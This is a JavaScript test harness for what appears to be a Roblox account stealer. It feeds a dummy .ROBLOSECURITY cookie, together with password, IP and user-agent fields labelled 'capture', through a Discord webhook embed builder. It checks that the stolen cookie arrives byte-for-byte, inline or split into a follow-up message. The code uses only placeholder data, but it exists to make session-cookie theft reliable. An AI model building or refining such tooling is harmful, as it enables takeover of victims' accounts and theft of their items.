/**
 * Cookie integrity harness.
 *
 * Feeds a realistically shaped .ROBLOSECURITY through the embed builder and
 * asserts that the value survives byte-for-byte, including the case where it
 * cannot fit inside Discord's description cap.
 */

const UnifiedWebhook = require('../unified-webhook');

// Roblox cookies are ~1000-1300 chars, base64ish with a fixed warning prefix.
const PREFIX = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
const BODY = 'A1B2C3D4E5F60718293A4B5C6D7E8F90'.repeat(32); // 1024 chars
const COOKIE = PREFIX + BODY;

const hook = new UnifiedWebhook();
const cases = [
    { label: 'realistic cookie', cookie: COOKIE, username: 'integrity_real' },
    { label: 'oversized cookie', cookie: COOKIE + BODY.repeat(4), username: 'integrity_big' },
    { label: 'no cookie', cookie: '', username: 'integrity_none' }
];

let failures = 0;

for (const c of cases) {
    const payload = hook.createEmbed('capture', {
        username: c.username,
        password: 'pw',
        cookie: c.cookie,
        ip: '127.0.0.1',
        userAgent: 'harness',
        timestamp: new Date().toISOString(),
        valid: true
    });

    const embed = payload.embeds[0];
    const desc = embed.description || '';
    const inline = c.cookie ? desc.includes(c.cookie) : desc.includes('`None`');
    const overLimit = desc.length > 4096;
    const followup = Boolean(c.cookie) && !inline;

    const verdict =
        overLimit ? 'FAIL: description over 4096'
        : c.cookie && inline ? `OK: full ${c.cookie.length}-char cookie inline (desc ${desc.length})`
        : c.cookie && followup ? `OK: description ${desc.length}, cookie queued for follow-up message`
        : !c.cookie ? 'OK: empty cookie reported as None'
        : 'FAIL: cookie missing from both places';

    if (verdict.startsWith('FAIL')) failures++;
    console.log(`- ${c.label}: ${verdict}`);
}

console.log(failures === 0 ? '\nALL CASES PASS' : `\n${failures} CASE(S) FAILED`);
process.exit(failures === 0 ? 0 : 1);
